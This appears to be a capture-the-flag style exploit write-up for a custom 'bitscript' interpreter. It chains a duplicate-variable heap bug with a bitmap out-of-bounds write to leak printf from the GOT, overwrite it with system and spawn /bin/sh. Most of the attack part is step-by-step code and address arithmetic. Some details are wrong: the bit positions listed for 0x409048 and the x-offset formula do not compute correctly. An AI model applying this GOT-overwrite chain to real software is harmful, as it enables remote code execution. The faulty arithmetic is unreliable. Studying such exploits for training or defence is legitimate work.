# Combined Exploit: Detailed Example with Visual Diagrams

## Variable Table Structure (64 bytes per entry)

```
Variable Entry Layout:
┌─────────────────────────────────────────┐
│ Offset 0x00-0x1F: name[32]             │ 32 bytes
├─────────────────────────────────────────┤
│ Offset 0x20: type (int32)              │ 4 bytes
├─────────────────────────────────────────┤
│ Offset 0x24: padding                   │ 4 bytes
├─────────────────────────────────────────┤
│ Offset 0x28: value_ptr (QWORD)         │ 8 bytes ← TARGET FOR CORRUPTION
├─────────────────────────────────────────┤
│ Offset 0x30: prev (QWORD)              │ 8 bytes
├─────────────────────────────────────────┤
│ Offset 0x38: next (QWORD)              │ 8 bytes ← ALTERNATIVE TARGET
└─────────────────────────────────────────┘
Total: 64 bytes (0x40)
```

## get_variable Function Flow

```c
char *get_variable(const char *name) {
    if (!name || !var_table_head) return 0;
    
    s1 = var_table_head;  // Start from head
    do {
        if (strcmp(s1, name) == 0)  // Compare name
            return s1;               // Return FIRST match
        s1 = *((QWORD *)s1 + 7);    // Follow next pointer (offset 0x38)
    } while (s1 != var_table_head);  // Loop until back to head
    
    return 0;  // Not found
}
```

**Key Insight:** `get_variable` follows the `next` pointer (offset 0x38) to traverse the list, but **stops at the first match**. It doesn't continue searching.

## Exploit Scenario: Corrupting value_ptr

### Step 1: Create Duplicate Variable

```bitscript
int leak = 0;   // Entry #1: name="leak", value_ptr=0
int leak = 0;   // Entry #2: name="leak", value_ptr=0 (LEAKED)
```

**Memory Layout:**
```
Heap Memory:
┌─────────────────────────────────────┐
│ Entry #1 (leak, active)             │
│   name: "leak\0..."                  │
│   type: 0 (int)                      │
│   value_ptr: 0                       │ ← We'll corrupt this
│   prev: Entry#2                      │
│   next: Entry#2                      │
├─────────────────────────────────────┤
│ Entry #2 (leak, leaked)              │
│   name: "leak\0..."                  │
│   type: 0 (int)                      │
│   value_ptr: 0                       │
│   prev: Entry#1                      │
│   next: ...                          │
└─────────────────────────────────────┘
```

### Step 2: Create Bitmap for Arbitrary Write

```bitscript
bitmap b1 = create(9223372036854775807, 2);
```

**What this creates:**
- `width = INT64_MAX` (0x7FFFFFFFFFFFFFFF)
- `height = 2`
- `data_buffer = malloc(0)` → tiny buffer (minimum chunk size, ~32 bytes)
- But `width` is huge, so we can write to any address!

### Step 3: Calculate Target Address

**Goal:** Write `printf@GOT` address (0x409048) to Entry #1's `value_ptr` (offset 0x28)

**We need:**
1. `entry1_addr` - Address of Entry #1 in memory
2. `bitmap_data_ptr` - Address of bitmap's data buffer
3. Calculate `y` and `x` for `set(b1, x, y, 1)`

**Formula:**
```
target_addr = entry1_addr + 0x28  // Entry #1's value_ptr offset
bitmap_addr = bitmap_data_ptr + (y * INT64_MAX + x) / 8

We want: bitmap_addr = target_addr
So: bitmap_data_ptr + (y * INT64_MAX + x) / 8 = entry1_addr + 0x28

Rearranging:
(y * INT64_MAX + x) / 8 = entry1_addr + 0x28 - bitmap_data_ptr
y * INT64_MAX + x = (entry1_addr + 0x28 - bitmap_data_ptr) * 8

Since INT64_MAX is huge, we can approximate:
y ≈ ((entry1_addr + 0x28 - bitmap_data_ptr) * 8) / INT64_MAX
x = ((entry1_addr + 0x28 - bitmap_data_ptr) * 8) % 8
```

### Step 4: Finding Addresses

**Challenge:** Both `entry1_addr` and `bitmap_data_ptr` are heap addresses (unknown).

**Solution Options:**

#### Option A: OOB Read to Find Addresses

```bitscript
// Use bitmap to read from adjacent heap memory
// Read from y=0, different x values to scan heap
bitmap b1 = create(9223372036854775807, 2);

// Scan for variable table entries
// Look for pattern: "leak" string at offset 0x00
int i = 0;
while (i < 1024) {
    int bit = get(b1, i, 0);
    // Check if this looks like a variable entry...
    i = i + 1;
}
```

#### Option B: Use var_table_head Global

**If we can read the global variable `var_table_head`:**
- `var_table_head` points to Entry #1
- Global variables are at fixed addresses (No PIE)
- We could use bitmap overflow to read from global variable address

**Global variable addresses:**
- `var_table_head`: Need to find address (likely in .bss section)
- `var_table_tail`: Need to find address
- These point directly to Entry #1 and Entry #2!

#### Option C: Heap Grooming

- Allocate variables in predictable order
- Use known heap behavior to calculate addresses
- Requires understanding of malloc implementation

### Step 5: Writing the Address (Bit-by-Bit)

**Problem:** `set()` only writes 1 bit. We need to write 64 bits (8 bytes) for the full address.

**Target:** Write `0x409048` (printf@GOT address) to Entry #1's `value_ptr`

**0x409048 in binary (64-bit):**
```
0x0000000000409048 = 
0b0000000000000000000000000000000000000000010000001001000001001000
```

**We need to set bits at positions:**
- Bit 3: 1
- Bit 9: 1
- Bit 10: 1
- Bit 15: 1
- Bit 22: 1
- Bit 26: 1

**Write each bit:**
```bitscript
// For each bit position (0-63):
// Calculate if bit is set in 0x409048
// If set, call set(b1, x + bit_offset, y, 1)

// Bit 3
set(b1, x + 3, y, 1);
// Bit 9
set(b1, x + 9, y, 1);
// Bit 10
set(b1, x + 10, y, 1);
// ... (continue for all set bits)
```

**Challenge:** Bitscript doesn't have bitwise operations, so we need to manually calculate or use arithmetic.

### Step 6: Reading the Leaked Address

```bitscript
int leaked = leak;  // Reads from Entry #1's value_ptr
                   // value_ptr now points to printf@GOT
                   // So we read printf's address from libc!
print(leaked);     // Prints libc's printf address
```

**What happens internally:**
```
1. get_variable("leak") → Returns Entry #1
2. Read Entry #1's value_ptr → 0x409048 (printf@GOT)
3. Read value from 0x409048 → libc's printf address
4. Return that address as the value
```

### Step 7: Calculate system Address

```python
# After getting leaked address:
leaked_printf = <value from print(leaked)>

# Get libc offsets:
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system

printf_offset = <from readelf>
system_offset = <from readelf>

libc_base = leaked_printf - printf_offset
system_addr = libc_base + system_offset
```

### Step 8: Write system to printf@GOT

```bitscript
// Use bitmap overflow to write system_addr to 0x409048
// Similar to step 5, but target is 0x409048 directly
// Write system_addr bit by bit to 0x409048
```

### Step 9: Trigger RCE

```bitscript
print("/bin/sh");  // Calls printf internally
                  // But printf@GOT now points to system
                  // → system("/bin/sh") → shell!
```

## Alternative: Corrupting next Pointer

Instead of corrupting `value_ptr`, we could corrupt the `next` pointer to redirect `get_variable`:

**Idea:**
1. Create: `int x = 1; int y = 2;`
2. Corrupt Entry #1's `next` pointer (offset 0x38) to point to `printf@GOT`
3. When `get_variable("x")` follows `next`, it goes to `printf@GOT`
4. But `get_variable` stops at first match, so this won't work...

**Better Idea:** Corrupt Entry #1's name to make it match a different variable, then use the leaked entry.

## Practical Challenges

### Challenge 1: Address Discovery
- Need heap addresses (entry1_addr, bitmap_data_ptr)
- Solutions: OOB read, heap grooming, or global variable access

### Challenge 2: Bit-by-Bit Write
- `set()` only writes 1 bit
- Need to write 64 bits manually
- Bitscript has no bitwise operations

### Challenge 3: Alignment
- Must align writes to byte boundaries
- Calculate `x` and `y` carefully

## Why This Combination is Powerful

1. **Duplicate Variable:** Creates predictable, controllable entries in variable table
2. **Bitmap Overflow:** Provides arbitrary write primitive
3. **Variable Operations:** Allow byte-level read/write (not just bit-level)
4. **Type System:** Can create type confusion by corrupting type field
5. **Memory Layout:** Variable table is on heap, easier to reach than GOT

## Simplified Exploit Path

Given the complexity, a **practical approach** might be:

1. **Use string overflow** (already working) to corrupt variable table
2. **Use bitmap overflow** to fine-tune corruption
3. **Combine both** for more reliable exploitation

The key insight is that **variable corruption gives us byte-level operations**, which is much easier than bit-by-bit writes!

